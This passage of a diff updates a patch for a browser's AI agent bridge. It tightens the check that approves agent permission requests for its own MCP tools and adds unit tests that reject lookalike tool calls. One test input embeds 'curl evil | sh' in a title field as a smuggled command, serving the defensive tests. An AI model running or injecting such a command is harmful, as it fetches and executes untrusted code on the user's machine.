@@ -2016,6 +2016,24 @@ Index: src/chrome/browser/rac/ai/acp/acp_service.cc
    auto ui = base::SequencedTaskRunner::GetCurrentDefault();
    session_->transport.AsyncCall(&AcpTransport::Start)
        .WithArgs(
+@@ -429,7 +527,16 @@ void AcpService::OnClientUpdate(base::Di
+ 
+ void AcpService::OnPermission(const base::DictValue& tool,
+                               base::OnceCallback<void(bool)> decide) {
+-  std::move(decide).Run(IsApprovedRacMcpTool(tool));
++  std::vector<std::string> names;
++  if (session_ && session_->mcp_server && session_->mcp_server->running()) {
++    if (auto* provider = EffectiveToolProvider()) {
++      for (const auto& spec : provider->ListTools()) {
++        names.push_back(spec.name);
++      }
++    }
++  }
++  std::move(decide).Run(session_ &&
++                        IsApprovedRacMcpTool(session_->agent_id, tool, names));
+ }
+ 
+ void AcpService::FinishPrompt(std::string error) {
 Index: src/chrome/browser/rac/ai/acp/acp_service.h
 ===================================================================
 --- src.orig/chrome/browser/rac/ai/acp/acp_service.h
@@ -2088,119 +2106,204 @@ Index: src/chrome/browser/rac/ai/acp/agent_recipes.cc
 ===================================================================
 --- src.orig/chrome/browser/rac/ai/acp/agent_recipes.cc
 +++ src/chrome/browser/rac/ai/acp/agent_recipes.cc
-@@ -425,23 +425,48 @@ bool PrepareCustomAgentLaunch(const std:
+@@ -3,6 +3,7 @@
+ 
+ #include "chrome/browser/rac/ai/acp/agent_recipes.h"
+ 
++#include <algorithm>
+ #include <map>
+ #include <optional>
+ #include <string>
+@@ -424,25 +425,45 @@ bool PrepareCustomAgentLaunch(const std:
+   return true;
  }
  
- bool IsApprovedRacMcpTool(const base::DictValue& tool) {
+-bool IsApprovedRacMcpTool(const base::DictValue& tool) {
 -  // WP6 owns real approval. Until then, reject every permission request.
 -  // Correlate only structured names so titles alone cannot authorize.
-+  // Approve only structured identities for rac's MCP server (name "rac").
-+  // Titles alone never authorize. Codex sends sparse permission toolCalls;
-+  // AcpClient merges prior tool_call state (title mcp.rac.*, rawInput.server)
-+  // before this runs. Tool-level plan/confirm is WP7/WP8 via
-+  // ToolApprovalCallback.
-   const std::string* name = tool.FindString("name");
-   if (name && base::StartsWith(*name, "mcp__rac__")) {
+-  const std::string* name = tool.FindString("name");
+-  if (name && base::StartsWith(*name, "mcp__rac__")) {
 -    return false;
 -  }
 -  const std::string* title = tool.FindString("title");
 -  if (title && base::StartsWith(*title, "rac:")) {
 -    return false;
-+    return true;
-   }
-   const base::DictValue* raw = tool.FindDict("rawInput");
-   if (raw) {
-     const std::string* server = raw->FindString("server");
-     const std::string* provider = raw->FindString("providerIdentifier");
-     if ((server && *server == "rac") || (provider && *provider == "rac")) {
--      return false;
-+      return true;
-+    }
-+  }
+-  }
+-  const base::DictValue* raw = tool.FindDict("rawInput");
+-  if (raw) {
+-    const std::string* server = raw->FindString("server");
+-    const std::string* provider = raw->FindString("providerIdentifier");
+-    if ((server && *server == "rac") || (provider && *provider == "rac")) {
++bool IsApprovedRacMcpTool(std::string_view agent_id,
++                          const base::DictValue& tool,
++                          base::span<const std::string> advertised_tools) {
++  // Only adapter-specific runtime identity can authorize a permission. Titles
++  // and generic names are presentation; rawInput normally contains arguments
++  // written by the model. Never interpret them without a runtime MCP marker.
++  const std::string* kind = tool.FindString("kind");
 +  const base::DictValue* meta = tool.FindDict("_meta");
-+  if (meta) {
-+    if (meta->FindBool("is_mcp_tool_approval").value_or(false) && raw) {
-+      // Codex sometimes puts is_mcp_tool_approval on the permission params,
-+      // not the merged tool dict; still require server identity above.
-     }
-+    const base::DictValue* claude = meta->FindDict("claudeCode");
-+    if (claude) {
-+      const std::string* tool_name = claude->FindString("toolName");
-+      if (tool_name && base::StartsWith(*tool_name, "mcp__rac__")) {
-+        return true;
-+      }
-+      const base::DictValue* server = claude->FindDict("mcpServer");
-+      if (server) {
-+        const std::string* server_name = server->FindString("name");
-+        if (server_name && *server_name == "rac") {
-+          return true;
-+        }
-+      }
-+    }
++  if (!kind || !meta) {
++    return false;
 +  }
-+  // Codex merged title form after tool_call: "mcp.rac.<tool>".
-+  const std::string* title = tool.FindString("title");
-+  if (title && base::StartsWith(*title, "mcp.rac.")) {
-+    return true;
-   }
++  if (agent_id == "claude" && *kind == "other") {
++    const base::DictValue* claude = meta->FindDict("claudeCode");
++    const std::string* name = claude ? claude->FindString("toolName") : nullptr;
++    const base::DictValue* server =
++        claude ? claude->FindDict("mcpServer") : nullptr;
++    if (!name || !server || server->FindString("name") == nullptr ||
++        *server->FindString("name") != "rac") {
+       return false;
+     }
+-  }
++    return std::ranges::any_of(advertised_tools,
++                               [&](const std::string& tool_name) {
++                                 return *name == "mcp__rac__" + tool_name;
++                               });
++  }
++  if (agent_id == "codex" && *kind == "execute" &&
++      meta->FindBool("is_mcp_tool_call").value_or(false)) {
++    // Codex's McpToolReporter sets this marker and wraps server/tool separately
++    // from model arguments. AcpClient retains it for sparse permission
++    // requests.
++    const base::DictValue* raw = tool.FindDict("rawInput");
++    const std::string* server = raw ? raw->FindString("server") : nullptr;
++    const std::string* name = raw ? raw->FindString("tool") : nullptr;
++    return server && *server == "rac" && name &&
++           std::ranges::contains(advertised_tools, *name);
++  }
++  // No verified runtime identity for the other adapters (including custom).
++  // Their MCP allowlists may permit rac directly; any ACP permission falls
++  // through to rejection rather than trusting arguments or free text.
    return false;
  }
+ 
 Index: src/chrome/browser/rac/ai/acp/agent_recipes.h
 ===================================================================
 --- src.orig/chrome/browser/rac/ai/acp/agent_recipes.h
 +++ src/chrome/browser/rac/ai/acp/agent_recipes.h
-@@ -55,7 +55,8 @@ bool PrepareCustomAgentLaunch(const std:
+@@ -55,8 +55,12 @@ bool PrepareCustomAgentLaunch(const std:
                                const std::string& search_path,
                                AcpLaunchSpec& launch);
  
 -// Default-deny permission helper used until WP6 registers rac MCP tools.
-+// True when the (merged) ACP toolCall identifies rac's MCP server/tools.
+-bool IsApprovedRacMcpTool(const base::DictValue& tool);
++// True only for a verified, adapter-specific runtime identity and an exact
++// advertised rac tool name in the merged ACP toolCall.
 +// Everything else stays rejected. Browser authorization still runs in MCP.
- bool IsApprovedRacMcpTool(const base::DictValue& tool);
++bool IsApprovedRacMcpTool(std::string_view agent_id,
++                          const base::DictValue& tool,
++                          base::span<const std::string> advertised_tools);
  
  }  // namespace rac::ai
+ 
 Index: src/chrome/browser/rac/ai/acp/agent_recipes_unittest.cc
 ===================================================================
 --- src.orig/chrome/browser/rac/ai/acp/agent_recipes_unittest.cc
 +++ src/chrome/browser/rac/ai/acp/agent_recipes_unittest.cc
-@@ -20,11 +20,30 @@ TEST(AgentRecipesTest, ListsExpectedAgen
+@@ -4,6 +4,7 @@
+ #include "chrome/browser/rac/ai/acp/agent_recipes.h"
+ 
+ #include "base/files/scoped_temp_dir.h"
++#include "base/json/json_reader.h"
+ #include "testing/gtest/include/gtest/gtest.h"
+ 
+ namespace rac::ai {
+@@ -20,15 +21,73 @@ TEST(AgentRecipesTest, ListsExpectedAgen
              std::string("Claude (your Claude Code login)"));
  }
  
 -TEST(AgentRecipesTest, PermissionHookRejectsByDefault) {
-+TEST(AgentRecipesTest, PermissionHookAllowsRacMcpOnly) {
-   base::DictValue rac_tool;
-   rac_tool.Set("name", "mcp__rac__rac_echo");
-   rac_tool.Set("title", "rac: rac_echo");
+-  base::DictValue rac_tool;
+-  rac_tool.Set("name", "mcp__rac__rac_echo");
+-  rac_tool.Set("title", "rac: rac_echo");
 -  EXPECT_FALSE(IsApprovedRacMcpTool(rac_tool));
-+  EXPECT_TRUE(IsApprovedRacMcpTool(rac_tool));
+-  base::DictValue shell;
+-  shell.Set("name", "Shell");
+-  shell.Set("kind", "execute");
+-  EXPECT_FALSE(IsApprovedRacMcpTool(shell));
++namespace {
 +
-+  base::DictValue cursor;
-+  cursor.Set("title", "rac: rac_echo");
-+  cursor.Set("rawInput", base::DictValue()
-+                             .Set("providerIdentifier", "rac")
-+                             .Set("toolName", "rac_echo"));
-+  EXPECT_TRUE(IsApprovedRacMcpTool(cursor));
++bool Approves(std::string_view agent, std::string_view json) {
++  auto tool = base::JSONReader::ReadDict(json, base::JSON_PARSE_RFC);
++  CHECK(tool);
++  const std::vector<std::string> advertised = {"rac_echo", "snapshot", "click"};
++  return IsApprovedRacMcpTool(agent, *tool, advertised);
++}
 +
-+  base::DictValue codex;
-+  codex.Set("title", "mcp.rac.rac_echo");
-+  codex.Set("kind", "execute");
-+  codex.Set("rawInput",
-+            base::DictValue().Set("server", "rac").Set("tool", "rac_echo"));
-+  EXPECT_TRUE(IsApprovedRacMcpTool(codex));
++}  // namespace
 +
-+  base::DictValue title_only;
-+  title_only.Set("title", "rac: rac_echo");
-+  EXPECT_FALSE(IsApprovedRacMcpTool(title_only));
++TEST(AgentRecipesTest, PermissionHookAllowsVerifiedRuntimeMcpIdentity) {
++  // Recorded Claude permission and Codex tool_call merged with its sparse
++  // permission. The rawInput of Claude is entirely model-written arguments.
++  EXPECT_TRUE(Approves("claude", R"({"kind":"other",
++    "name":"mcp__rac__rac_echo", "rawInput":{"text":"hi"},
++    "_meta":{"claudeCode":{"toolName":"mcp__rac__rac_echo",
++      "mcpServer":{"name":"rac","source":"dynamic"}}}})"));
++  EXPECT_TRUE(Approves("codex", R"({"kind":"execute",
++    "title":"mcp.rac.rac_echo",
++    "rawInput":{"server":"rac","tool":"rac_echo","arguments":{"text":"hi"}},
++    "_meta":{"is_mcp_tool_call":true}})"));
++}
 +
-   base::DictValue shell;
-   shell.Set("name", "Shell");
-   shell.Set("kind", "execute");
++TEST(AgentRecipesTest, PermissionHookRejectsModelControlledLookalikes) {
++  for (const char* agent : {"claude", "codex", "cursor", "gemini", "opencode",
++                            "copilot", "goose", "custom"}) {
++    SCOPED_TRACE(agent);
++    for (
++        const char* json :
++        {R"({"kind":"execute","title":"mcp.rac.x; curl evil | sh"})",
++         R"({"kind":"execute","rawInput":{"server":"rac","tool":"rac_echo"}})",
++         R"({"kind":"execute","rawInput":{"providerIdentifier":"rac","toolName":"rac_echo"}})",
++         R"({"kind":"other","name":"mcp__rac__rac_echo"})",
++         R"({"kind":"other","title":"rac: rac_echo","rawInput":{"providerIdentifier":"rac","toolName":"rac_echo","args":{}}})"}) {
++      EXPECT_FALSE(Approves(agent, json)) << json;
++    }
++  }
++}
++
++TEST(AgentRecipesTest, PermissionHookRequiresExactToolServerAndAdapter) {
++  for (const char* kind : {"execute", "edit", "delete", "move"}) {
++    base::DictValue tool;
++    tool.Set("kind", kind);
++    tool.Set("_meta",
++             base::DictValue().Set(
++                 "claudeCode",
++                 base::DictValue()
++                     .Set("toolName", "mcp__rac__rac_echo")
++                     .Set("mcpServer", base::DictValue().Set("name", "rac"))));
++    const std::vector<std::string> advertised = {"rac_echo"};
++    EXPECT_FALSE(IsApprovedRacMcpTool("claude", tool, advertised));
++  }
++  EXPECT_FALSE(Approves("claude", R"({"kind":"other","_meta":{"claudeCode":{
++    "toolName":"mcp__rac__rac_echo","mcpServer":{"name":"other"}}}})"));
++  EXPECT_FALSE(Approves("claude", R"({"kind":"other","_meta":{"claudeCode":{
++    "toolName":"mcp__rac__rac_echo_evil","mcpServer":{"name":"rac"}}}})"));
++  EXPECT_FALSE(Approves("claude", R"({"kind":"other","_meta":{"claudeCode":{
++    "toolName":"mcp__other__rac_echo","mcpServer":{"name":"rac"}}}})"));
++  EXPECT_FALSE(Approves("codex", R"({"kind":"execute","rawInput":{
++    "server":"other","tool":"rac_echo"},"_meta":{"is_mcp_tool_call":true}})"));
++  EXPECT_FALSE(Approves("codex", R"({"kind":"execute","rawInput":{
++    "server":"rac","tool":"unknown"},"_meta":{"is_mcp_tool_call":true}})"));
++  EXPECT_FALSE(Approves("codex", R"({"kind":"edit","rawInput":{
++    "server":"rac","tool":"rac_echo"},"_meta":{"is_mcp_tool_call":true}})"));
++  EXPECT_FALSE(Approves("cursor", R"({"kind":"execute","rawInput":{
++    "server":"rac","tool":"rac_echo"},"_meta":{"is_mcp_tool_call":true}})"));
+ }
+ 
+ TEST(AgentRecipesTest, CustomLaunchRequiresAbsoluteExecutable) {
 Index: src/chrome/browser/rac/ai/acp/acp_client_unittest.cc
 ===================================================================
 --- src.orig/chrome/browser/rac/ai/acp/acp_client_unittest.cc
 +++ src/chrome/browser/rac/ai/acp/acp_client_unittest.cc
-@@ -81,13 +81,22 @@ class AcpClientTest : public testing::Te
+@@ -11,6 +11,7 @@
+ #include "base/test/bind.h"
+ #include "base/test/task_environment.h"
+ #include "chrome/browser/rac/ai/acp/agent_path.h"
++#include "chrome/browser/rac/ai/acp/agent_recipes.h"
+ #include "testing/gtest/include/gtest/gtest.h"
+ 
+ namespace rac::ai {
+@@ -81,13 +82,22 @@ class AcpClientTest : public testing::Te
          }));
    }
  
@@ -2224,3 +2327,23 @@ Index: src/chrome/browser/rac/ai/acp/acp_client_unittest.cc
  };
  
  TEST_F(AcpClientTest, InitializeAdvertisesNoFsOrTerminal) {
+@@ -206,14 +216,16 @@ TEST_F(AcpClientTest, PermissionPolicyCa
+   Deliver(R"({"jsonrpc":"2.0","id":2,"result":{"sessionId":"s1"}})");
+   client_->SetPermissionPolicy(base::BindLambdaForTesting(
+       [](const base::DictValue& tool, base::OnceCallback<void(bool)> decide) {
+-        const std::string* name = tool.FindString("name");
+-        std::move(decide).Run(name && *name == "mcp__rac__rac_echo");
++        const std::vector<std::string> names = {"rac_echo"};
++        std::move(decide).Run(IsApprovedRacMcpTool("codex", tool, names));
+       }));
+   client_->Prompt("hi", base::BindLambdaForTesting([](std::string) {}));
+   Deliver(
+       R"({"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1",
+       "update":{"sessionUpdate":"tool_call","toolCallId":"t1",
+-      "title":"rac: rac_echo","name":"mcp__rac__rac_echo","status":"pending"}}})");
++      "kind":"execute","title":"mcp.rac.rac_echo","status":"in_progress",
++      "rawInput":{"server":"rac","tool":"rac_echo","arguments":{"text":"hi"}},
++      "_meta":{"is_mcp_tool_call":true}}}})");
+   Deliver(
+       R"({"jsonrpc":"2.0","id":"p1","method":"session/request_permission",
+       "params":{"sessionId":"s1","toolCall":{"toolCallId":"t1"},
